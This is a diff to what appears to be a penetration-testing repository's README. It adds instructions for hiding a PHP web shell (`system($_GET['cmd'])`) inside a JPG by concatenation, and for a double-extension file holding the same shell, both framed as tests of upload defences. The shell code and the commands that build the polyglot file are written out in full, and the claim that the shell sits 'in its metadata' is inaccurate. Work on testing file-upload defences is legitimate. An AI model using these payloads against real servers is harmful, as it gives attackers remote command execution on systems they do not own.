@@ -95,3 +95,37 @@ This is an osquery rule to check for RCE.
 
 -- This rule is designed to run once and report its findings.
 
+### embedded_shell.jpg
+
+This is a PHP shell embedded through concatonate in a .jpg file.
+The original image 134685209.jpg is a picture of my EHPT+ certificate with this embedded.
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+I did this by saving the shellcode as shell.php 
+I then used:
+
+```bash
+wget https://raw.githubusercontent.com/DeadmanXXXII/Curriculum-Vitae/main/134685209.jpg
+```
+
+to pull the image to my terminal.
+Once here in the CLI I entered:
+
+```bash
+cat 134685209.jpg shell.php > embedded_shell.jpg
+```
+This then creates the file with the shellcode embed in its metadata.
+
+### shell.php.jpg
+This is simply a double extension to test upload defense mechanics.
+The file contains the shell code:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+
+
